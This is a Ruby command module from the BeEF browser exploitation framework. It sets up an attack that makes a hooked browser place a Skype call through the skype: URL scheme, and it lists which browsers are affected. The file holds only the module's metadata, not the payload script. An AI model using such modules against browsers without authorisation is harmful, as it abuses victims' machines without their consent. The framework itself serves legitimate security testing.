module BeEF
module Modules
module Commands


class Insecure_url_skype < BeEF::Command

  #
  # Defines and set up the command module.
  #
  def initialize
    super({
      'Name' => 'Insecure URL Handling - Skype Call',
      'Description' => 'This module will force the browser to attempt a skype call. It will exploit the insecure handling of URL schemes<br>
      <br>
      The protocol handler used will be: skype',
      'Category' => 'Host',
      'Author' => 'xntrik, Nitesh Dhanjani',
      'Data' => [
        { 'name' => 'tel_num', 'ui_label'=>'Number', 'value' =>'5551234', 'width' => '200px' }
      ],
      'File' => __FILE__
    })

    set_target({
      'verified_status' =>  VERIFIED_WORKING,
      'browser_name' =>     S
    })
    
    set_target({
      'verified_status' => VERIFIED_USER_NOTIFY,
      'browser_name' => C
    })
    
    set_target({
      'verified_status' => VERIFIED_USER_NOTIFY,
      'browser_name' => FF
    })

    set_target({
      'verified_status' => VERIFIED_USER_NOTIFY,
      'browser_name' => O
    })

    use 'beef.dom'
    use_template!
  end

  def callback
    content = {}
    content['Result'] = @datastore['result']
    save content

  end

end

end
end
end
